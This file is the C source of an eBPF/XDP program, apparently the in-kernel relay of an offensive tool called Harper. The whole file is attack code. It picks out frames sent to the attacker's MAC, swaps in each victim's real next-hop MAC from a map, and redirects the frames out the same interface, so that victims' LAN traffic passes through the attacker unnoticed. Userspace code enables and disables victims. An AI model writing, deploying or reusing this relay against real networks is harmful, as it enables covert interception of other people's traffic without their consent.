/*
 * harper-ebpf: in-kernel MITM relay for Harper — XDP variant.
 *
 * Attached as an XDP program on the MITM interface. For every frame whose
 * Ethernet destination equals the attacker MAC, we look up the correct next-hop
 * MAC in the `harper_map` BPF LRU hash map (keyed by source MAC), rewrite the
 * Ethernet header in place, then redirect the frame to the egress of the same
 * interface via a DEV map, bypassing the kernel network stack entirely (no SKB
 * allocation).
 *
 * The maps are populated from userspace as victims are enabled/disabled.
 */
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

#define ETH_ALEN 6

struct mac_key {
    __u8 mac[ETH_ALEN];
};

/* key = 6-byte source MAC, value = 6-byte next-hop (rewrite) MAC. */
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(key_size, ETH_ALEN);
    __uint(value_size, ETH_ALEN);
    __uint(max_entries, 4096);
    __type(key, struct mac_key);
    __type(value, struct mac_key);
} harper_map SEC(".maps");

/* Our own MAC, set from userspace (single-entry array, key 0). */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, ETH_ALEN);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct mac_key);
} harper_own SEC(".maps");

/* DEV map: key 0 → ifindex of the egress interface.
 * XDP uses this to redirect without SKB allocation. */
struct {
    __uint(type, BPF_MAP_TYPE_DEVMAP);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} egress_iface_map SEC(".maps");

static __always_inline int mac_eq(const __u8 *a, const __u8 *b)
{
    return a[0] == b[0] && a[1] == b[1] && a[2] == b[2] &&
           a[3] == b[3] && a[4] == b[4] && a[5] == b[5];
}

SEC("xdp")
int harper_relay(struct xdp_md *ctx)
{
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    __u32 own_key = 0;
    __u8 *own = bpf_map_lookup_elem(&harper_own, &own_key);
    if (!own)
        return XDP_PASS;

    if (!mac_eq(eth->h_dest, own))
        return XDP_PASS;

    struct mac_key key;
    __builtin_memcpy(&key.mac, eth->h_source, ETH_ALEN);

    __u8 *next = bpf_map_lookup_elem(&harper_map, &key);
    if (!next)
        return XDP_DROP;

    __builtin_memcpy(eth->h_dest, next, ETH_ALEN);
    __builtin_memcpy(eth->h_source, own, ETH_ALEN);

    return bpf_redirect_map(&egress_iface_map, 0, 0);
}
